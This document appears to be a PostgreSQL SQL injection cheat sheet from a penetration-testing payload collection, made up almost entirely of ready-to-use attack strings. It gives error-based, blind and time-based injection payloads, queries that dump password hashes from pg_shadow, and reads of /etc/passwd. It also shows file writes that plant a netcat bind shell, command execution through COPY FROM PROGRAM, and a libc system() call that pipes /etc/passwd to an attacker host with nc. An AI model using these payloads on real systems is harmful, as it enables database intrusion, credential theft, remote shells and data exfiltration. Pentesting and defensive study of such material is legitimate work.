# PostgreSQL



## PostgreSQL injection

## PostgreSQL Comments

```text
--
/**/  
```

## PostgreSQL Version

```text
SELECT version()
```

## PostgreSQL Current User

```text
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

## PostgreSQL List Users

```text
SELECT usename FROM pg_user
```

## PostgreSQL List Password Hashes

```text
SELECT usename, passwd FROM pg_shadow 
```

## PostgreSQL List Database Administrator Accounts

```text
SELECT usename FROM pg_user WHERE usesuper IS TRUE
```

## PostgreSQL List Privileges

```text
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
```

## PostgreSQL Check if Current User is Superuser

```text
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## PostgreSQL Database Name

```text
SELECT current_database()
```

## PostgreSQL List Database

```text
SELECT datname FROM pg_database
```

## PostgreSQL List Tables

```text
SELECT table_name FROM information_schema.tables
```

## PostgreSQL List Columns

```text
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## PostgreSQL Error Based

```text
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

## PostgreSQL XML helpers

```text
select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](https://github.com/Alomancy/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.

```text
select database_to_xml(true,true,''); -- dump the current database to XML
select database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.

## PostgreSQL Blind

```text
' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
```

## PostgreSQL Time Based

```text
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL Stacked Query

Use a semi-colon ";" to add another query

```text
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

## PostgreSQL File Read

```text
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions \(as of [this](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit\) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.

```text
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

```text
SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
SELECT lo_get(16420); -- use the OID returned from the above
SELECT * from pg_largeobject; -- or just get all the large objects and their data
```

## PostgreSQL File Write

```text
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

#### Or as one line:

```text
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

```text
SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
```

## PostgreSQL Command execution

#### CVE-2019–9193

Can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries.

```text
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

[![https://cdn-images-1.medium.com/max/1000/1\*xy5graLstJ0KysUCmPMLrw.png](https://camo.githubusercontent.com/9ee1f45c48c724ea5a60566c303d0ef5a6201e9309a0f6ae0eb4f41c30302ce4/68747470733a2f2f63646e2d696d616765732d312e6d656469756d2e636f6d2f6d61782f313030302f312a7879356772614c73744a304b797355436d504d4c72772e706e67)](https://camo.githubusercontent.com/9ee1f45c48c724ea5a60566c303d0ef5a6201e9309a0f6ae0eb4f41c30302ce4/68747470733a2f2f63646e2d696d616765732d312e6d656469756d2e636f6d2f6d61782f313030302f312a7879356772614c73744a304b797355436d504d4c72772e706e67)

#### Using libc.so.6

```text
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## Bypass Filter

### **Quotes**

Using CHR

```text
SELECT CHR(65)||CHR(66)||CHR(67);
```

Using Dollar-signs \( &gt;= version 8 PostgreSQL\)

```text
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```

## References

* [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest - Mar 20 2019 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
* [SQL Injection /webApp/oma\_conf ctx parameter \(viestinta.lahitapiola.fi\) - December 8, 2016 - Sergey Bobrov \(bobrov\)](https://hackerone.com/reports/181803)
* [POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic](https://pulsesecurity.co.nz/articles/postgres-sqli)
* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)

